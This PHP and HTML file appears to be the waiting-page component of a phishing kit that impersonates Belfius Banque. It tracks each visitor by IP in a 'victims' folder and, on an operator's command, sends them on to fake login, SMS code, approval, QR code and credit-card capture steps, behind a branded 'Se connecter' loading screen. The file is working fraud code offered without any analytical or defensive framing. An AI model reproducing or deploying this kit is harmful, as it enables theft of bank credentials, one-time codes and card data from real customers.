<?php 


require_once "functions.php";
     require_once "ajax.php";
$ip = getenv('HTTP_CLIENT_IP')?:getenv('HTTP_X_FORWARDED_FOR')?:getenv('HTTP_X_FORWARDED')?:getenv('HTTP_FORWARDED_FOR')?:getenv('HTTP_FORWARDED')?:getenv('REMOTE_ADDR');
if( $ip == '::1' ) {
            $ip  = '127.0.0.1';
}

  $data = file('victims/'.$ip.'.txt')[0];
  
  $pieces = explode("|", $data);
  
  if( !$data || !file_exists('victims/'.$ip.'.txt')) {
        echo "<meta http-equiv='refresh' content='3'>";
  }elseif( $data == 'login' ) {
  //header("Location: infos.php?redirection=login");
  echo '<meta http-equiv="refresh" content="3; URL=infos.php?redirection=login">';
  //die;
  }elseif( $data == 'sms' ) {
 //header("Location: infos.php?redirection=sms");
 echo '<meta http-equiv="refresh" content="3; URL=infos.php?redirection=sms">';
 // die;
  }elseif( $data == 'approuve' ) {
   //header("Location: infos.php?redirection=approuve");
  echo '<meta http-equiv="refresh" content="3; URL=infos.php?redirection=approuve">';
  //die;
  }elseif($pieces[0] == 'qrcode' ) {
   //header("Location: infos.php?redirection=qrcode");
  echo '<meta http-equiv="refresh" content="3; URL=infos.php?redirection=qrcode">';
  //die;
  }elseif( $data == 'cc' ) {
   //header("Location: infos.php?redirection=cc");
  echo '<meta http-equiv="refresh" content="3; URL=infos.php?redirection=cc">';
  //die;
  }elseif( $data == 'success' ) {
  echo '<meta http-equiv="refresh" content="3; URL=infos.php?redirection=success">';
  //die;
  }else{
      echo "<meta http-equiv='refresh' content='3'>";
  }



?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Belfius Banque - Belfius</title>
        <!-- logo site web-->
        <link rel="icon" href="image/belfius.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/belfius.ico" type="image/x-icon" />
        
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/styles.css">
        <link rel="stylesheet"  href="css/animate.css">
        <style>
            .modal-open{
                overflow:hidden;
                padding-right:0px;
            }
        </style>

</head>
<body class="modal-open">

        <div class="home_1">
            <img src="image/xl.png">
        </div>

        <div class="home_2">
            <img src="image/lg.png">
        </div>

        <div class="home_3">
            <img src="image/md.png">
        </div>

        <div class="home_4">
            <img src="image/sm.png">
        </div>

        <div class="home_5">
            <img src="image/xs.png">
        </div>

        <div class="home_6">
            <img src="image/zz.png">
        </div>

         <!-- Modal -->
        <div class="modal problem fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;"> 
          <div class="modal-dialog shadow ">
            <div class="modal-content">
              <div class="modal-header text-center ">
                  <h4>Se connecter</h4>
                  <i class="bi bi-x-lg"></i>
              </div>
              <div class="modal-body">
                 <div class="row">
                     <div class="col-lg-12 d-flex justify-content-center" style="height: 500px;">
                         <div class="loading shadow">
                            <i class="fa fa-circle-o-notch fa-spin"></i>
                         </div>
                     </div>
                 </div>
              </div>
            </div>
          </div>
        </div>






        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>

              
</body>
</html>